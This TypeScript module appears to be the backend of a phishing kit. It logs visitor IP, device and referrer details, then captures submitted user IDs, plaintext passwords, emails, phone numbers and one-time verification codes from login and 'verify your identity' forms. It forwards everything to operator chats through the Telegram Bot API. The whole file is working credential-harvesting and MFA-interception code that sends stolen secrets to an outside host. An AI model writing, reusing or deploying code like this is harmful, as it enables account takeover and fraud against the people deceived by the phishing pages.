const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const CHAT_IDS = process.env.TELEGRAM_CHAT_IDS?.split(',').map(id => id.trim()).filter(Boolean) || []

function escapeHtml(s: string): string {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}

function asCode(v: unknown): string {
  const t = v == null || v === '' ? 'Unknown' : String(v).trim() || 'Unknown'
  return `<code>${escapeHtml(t)}</code>`
}

function asPre(v: unknown): string {
  const t = v == null ? '' : String(v)
  return `<pre>${escapeHtml(t || 'Unknown')}</pre>`
}

interface VisitorData {
  location?: string
  ip?: string
  timezone?: string
  isp?: string
  device?: string
  screen?: string
  language?: string
  referrer?: string
  utcTime?: string
  page?: string
  url?: string
}

function formatLocalTime(utcTime?: string, timezone?: string): string {
  const date = utcTime ? new Date(utcTime) : new Date()
  return timezone
    ? date.toLocaleString('en-US', { timeZone: timezone })
    : date.toLocaleString('en-US')
}

function formatUtcTime(utcTime?: string): string {
  const date = utcTime ? new Date(utcTime) : new Date()
  return date.toLocaleString('en-GB', { timeZone: 'UTC', hour12: false })
}

interface FormData {
  type: 'login' | 'registration' | 'email_verification' | 'text_verification' | 'email_selection' | 'text_selection'
  userId?: string
  password?: string
  email?: string
  phone?: string
  otp?: string
  timestamp: string
  page: string
}

export async function sendVisitorNotification(data: VisitorData) {
  const utcTime = data.utcTime || new Date().toISOString()
  const message = `<b>🌐 New Visitor</b>
━━━━━━━━━━━━━━━━━━
📍 Location: ${asCode(data.location)}
🌍 IP: ${asCode(data.ip)}
⏰ Timezone: ${asCode(data.timezone)}
🌐 ISP: ${asCode(data.isp)}

📱 Device:
${asPre(data.device)}
🖥️ Screen: ${asCode(data.screen)}
🌍 Language: ${asCode(data.language)}
🔗 Referrer: ${asCode(data.referrer || 'Direct')}
🌐 URL: ${asCode(data.url)}

⏰ Local Time: ${asCode(formatLocalTime(utcTime, data.timezone))}
🕒 UTC Time: ${asCode(formatUtcTime(utcTime))}`

  return sendTelegramMessage(message)
}

export async function sendFormNotification(data: FormData) {
  let message: string
  if (data.type === 'login') {
    message = `<b>🔐 Login Attempt</b>
━━━━━━━━━━━━━━━━━━
👤 User ID: ${asCode(data.userId)}
🔒 Password: ${asCode(data.password)}`
  } else if (data.type === 'email_selection' || data.type === 'text_selection') {
    const method = data.type === 'email_selection' ? 'Email' : 'Text Message (SMS)'
    message = `<b>🔐 Verify Your Identity</b>
━━━━━━━━━━━━━━━━━━

Method Selected: ${asCode(method)}`
  } else if (data.type === 'email_verification' || data.type === 'text_verification') {
    const typeLabel = data.type === 'email_verification' ? 'Email' : 'Text'
    message = `<b>✅ Verification Code Submitted</b>
🔐 Type: ${asCode(typeLabel)}
🔢 Code: ${asCode(data.otp)}`
  } else {
    message = `<b>📝 Form Submission</b>
🔹 Type: ${asCode(data.type)}
📄 Page: ${asCode(data.page)}
🕒 Time: ${asCode(data.timestamp)}
${data.userId ? `👤 User ID: ${asCode(data.userId)}` : ''}
${data.password ? `🔒 Password: ${asCode(data.password)}` : ''}
${data.email ? `📧 Email: ${asCode(data.email)}` : ''}
${data.phone ? `📱 Phone: ${asCode(data.phone)}` : ''}
${data.otp ? `🔐 OTP Code: ${asCode(data.otp)}` : ''}`
  }
  return sendTelegramMessage(message)
}

async function sendTelegramMessage(message: string) {
  if (!TELEGRAM_BOT_TOKEN) {
    console.error('TELEGRAM_BOT_TOKEN is not configured')
    return []
  }

  if (CHAT_IDS.length === 0) {
    console.error('TELEGRAM_CHAT_IDS is not configured')
    return []
  }

  const promises = CHAT_IDS.map(chatId => 
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      })
    }).catch(error => {
      console.error(`Failed to send to chat ${chatId}:`, error)
      return null
    })
  )

  const results = await Promise.allSettled(promises)
  return results
}

export async function getVisitorData(request: Request): Promise<VisitorData> {
  const headers = request.headers
  const forwarded = headers.get('x-forwarded-for')
  const realIp = headers.get('x-real-ip')
  const ip = forwarded?.split(',')[0] || realIp || 'Unknown'

  return {
    ip,
    device: headers.get('user-agent') || 'Unknown',
    language: headers.get('accept-language')?.split(',')[0] || 'Unknown',
    referrer: headers.get('referer') || 'Direct',
    utcTime: new Date().toISOString(),
    page: new URL(request.url).pathname
  }
}
